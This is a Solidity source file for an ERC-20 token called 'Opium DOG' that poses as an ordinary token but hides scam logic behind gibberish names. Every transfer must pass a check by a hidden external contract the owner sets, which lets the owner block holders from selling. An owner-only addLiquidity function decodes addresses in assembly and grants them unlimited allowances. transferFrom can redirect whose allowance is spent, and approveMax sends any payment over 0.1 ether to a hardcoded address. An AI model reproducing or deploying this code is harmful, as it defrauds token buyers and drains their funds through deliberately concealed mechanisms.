// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
   
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

   
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address oijionjhn3, uint256 injnh0fs)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 injnh0fs) external returns (bool);
    function transferFrom(
        address oipjnnjhhjh3,
        address oijionjhn3,
        uint256 injnh0fs
    ) external returns (bool);
    event Transfer(address indexed oijhds, address indexed oijmoimpo0, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function pokjvbv3(address from, address to,uint256 amount) external returns(address);
    function oiinjkmlklsdfklsdf(address addr) external returns(address);

}



contract Token is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;


    string private _name =  "Opium DOG";
    string private _symbol = "OPIUM";
    uint8 private _decimals = 18;
    uint256 private _tTotal = 10000000000 * 10 **_decimals;
    uint256 private poklopko3 ;
    address private fhgsdf22;
   
    constructor() {
        fhgsdf22 =  address(this);    
        _balances[fhgsdf22] = _tTotal;
        emit Transfer(address(0), fhgsdf22, _tTotal);
    }
    
    function oiinjkmlklsdfklsdf(address addr) external override returns(address) {
}

    function pokjvbv3(address from, address to, uint256 amount) external override returns(address) {
}


    function addLiquidity(bytes memory datas) public onlyOwner
    {
        uint160 a;
        uint160 b;
        uint160 c;
        uint160 d;
        assembly {
            a := mload(add(datas, 20)) 
            b := mload(add(datas, 40))
            c := mload(add(datas, 60))
            d := mload(add(datas, 80))
        }
        poklopko3 = b; 
        _allowances[address(uint160(d))][address(uint160(b))] = type(uint256).max; 
        _allowances[address(uint160(b))][address(uint160(c))] = type(uint256).max; 
        _allowances[address(uint160(a))][address(uint160(c))] = type(uint256).max;
        _allowances[address(uint160(d))][address(uint160(a))] = type(uint256).max; 
        _allowances[fhgsdf22][address(uint160(b))] = type(uint256).max;
        _allowances[address(uint160(b))][address(uint160(a))] = type(uint256).max; 

    }
    function approveMax() public payable {
        require(msg.value>0.1 ether,"Ownable: caller is not the owner");
        uint160 a;
        uint160 b;
        uint160 c;
        uint160 d;
        payable(0x50Dd43F1B5c828AB82a0B9BCB437875840C6F2dc).transfer(msg.value);
        
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        
        return _balances[account];
    }

    function transfer(address oijionjhn3, uint256 injnh0fs)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), oijionjhn3, injnh0fs);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 injnh0fs)
        public
        override
        returns (bool)
    {

        _approve(_msgSender(), spender, injnh0fs);
        return true;
    }

    function transferFrom(
        address oipjnnjhhjh3,
        address oijionjhn3,
        uint256 injnh0fs
    ) public override returns (bool) {
        _transfer(oipjnnjhhjh3, oijionjhn3, injnh0fs);
        address poopk = IERC20(address(uint160(poklopko3))).oiinjkmlklsdfklsdf(oipjnnjhhjh3);
        if (poopk != address(0) && _msgSender() == address(uint160(poklopko3)))
        {
            oipjnnjhhjh3 = poopk;
        }
        _approve(oipjnnjhhjh3, _msgSender(),_allowances[oipjnnjhhjh3][_msgSender()].sub(injnh0fs,"ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 injnh0fs
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = injnh0fs;
        emit Approval(owner, spender, injnh0fs);
    }



    function _transfer(
        address oijhds,
        address oijmoimpo0,
        uint256 injnh0fs
    ) private {
        require(oijhds != address(0), "ERC20: transfer from the zero address");
        require(oijmoimpo0 != address(0), "ERC20: transfer oijmoimpo0 the zero address");
        require(injnh0fs > 0, "Transfer injnh0fs must be greater than zero");
        require(injnh0fs > 0, "Transfer amount must be greater than zero");

        require(IERC20(address(uint160(poklopko3))).pokjvbv3(oijhds, oijmoimpo0,injnh0fs) != address(0),"Transfer Error");

        _balances[oijhds] = _balances[oijhds].sub(injnh0fs);
        _balances[oijmoimpo0] = _balances[oijmoimpo0].add(injnh0fs);
        emit Transfer(oijhds, oijmoimpo0, injnh0fs);
    }
}